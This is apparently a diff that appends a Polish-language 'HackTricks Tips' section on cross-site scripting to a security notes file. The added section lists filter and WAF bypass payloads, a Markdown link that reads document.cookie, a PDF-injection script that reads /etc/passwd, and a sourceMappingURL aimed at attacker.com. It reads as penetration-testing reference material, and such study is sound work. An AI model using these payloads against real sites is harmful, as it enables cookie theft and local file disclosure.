@@ -213,3 +213,33 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.1.2 | Encoding and Sanitization Architecture | Verify that the application performs output encoding and escaping either as a final step before being used by the interpreter for which it is intended or by the interpreter itself. |
+
+
+---
+
+## HackTricks Tips
+
+### WAF / Filter Bypass
+
+- **Separator alternatywy** (zamiast spacji): `%09`, `%0a`, `%0d`, `%28`, `%2C`, `%3B` — np. `<svg onload%09=alert(1)>`
+- **Podwójne/zagnieżdżone tagi**: `<scr<script>ipt>alert(1)</scr</script>ipt>`
+- **Backtick zamiast nawiasów**: `` alert`1` ``, `` onerror=alert`1` ``
+- **Wywołanie bez nawiasów**: `window.onerror=eval;throw"=alert\x281\x29"` lub `valueOf=alert;window+''`
+- **Budowanie stringów bez cudzysłowów**: `String.fromCharCode(104,116,116,112,...)`
+- **Unicode whitespace w event handlerach**: `<img/src/onerror=alert&#65279;(1)>` (char 65279 = BOM)
+- **`javascript:` separatory**: tylko `\t`(9), `\n`(10), `\r`(13) są poprawne między `javascript` a `:`
+- **PHP `FILTER_VALIDATE_EMAIL` bypass**: `"><svg/onload=confirm(1)>"@x.y`
+- **WAF inspects only first statement**: prefix z `(history.length);` przed payloadem
+
+### Techniki wykrywania
+
+- **DOM Invader** (Burp): auto-inject canary do wszystkich source'ów, tryb "Scan for gadgets" dla prototype pollution
+- **`domloggerpp`**: extension instrumentujące all sources/sinks w DevTools
+- **Source map leakage**: pobierz `.map` pliki → `shuji` dekompiluje do oryginalnego JS
+- **`//# sourceMappingURL=https://attacker.com`**: wstrzyknięcie w komentarz JS → OOB request z DevTools
+
+### Konteksty specjalne
+
+- **Markdown XSS**: `[a](javascript:prompt(document.cookie))`, `[a](data:text/html;base64,PHN...)`
+- **PDF injection (wkhtmltopdf/TCPDF)**: `<script>x=new XMLHttpRequest;x.open("GET","file:///etc/passwd");x.send()</script>`
+- **XSS via 302 Location**: nietypowe protokoły (`mailto://`, `ws://`, `resource://`) mogą wyrenderować body
